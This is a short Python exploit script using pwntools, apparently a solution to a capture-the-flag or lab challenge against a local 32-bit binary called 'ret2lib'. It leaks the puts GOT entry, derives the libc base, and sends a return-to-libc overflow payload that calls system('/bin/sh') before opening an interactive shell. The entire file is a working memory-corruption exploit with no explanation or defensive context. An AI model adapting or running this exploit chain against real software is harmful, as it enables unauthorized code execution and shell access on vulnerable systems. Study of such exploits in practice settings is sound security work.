from pwn import *

context.arch = "i386"
# context.log_level = "DEBUG"

p = process("./ret2lib")

e = ELF("./ret2lib")
libc = ELF("../libc.so.6")

def getOffset(name):
    return libc.symbols[name] - libc.symbols["__libc_start_main"]

def getOffsetSearch(text):
    return next(libc.search("/bin/sh")) - libc.symbols["__libc_start_main"]

p.sendlineafter(":", str(e.got["puts"]))
p.recvuntil(": 0x")

puts_got = int(p.recvuntil("\n")[:-1], 16)

print("[*] puts_got is " + hex(puts_got))

libc_base = puts_got - getOffset("puts")
libc_system = libc_base + getOffset("system")
libc_exit = libc_base + getOffset("exit")
libc_sh = libc_base + getOffsetSearch("/bin/sh")

payload = ""

payload += "A"*0x38
payload += "BBBB"

payload += p32(libc_system)
payload += p32(libc_exit)
payload += p32(libc_sh)

p.sendlineafter(":", payload)
p.recv()

p.interactive()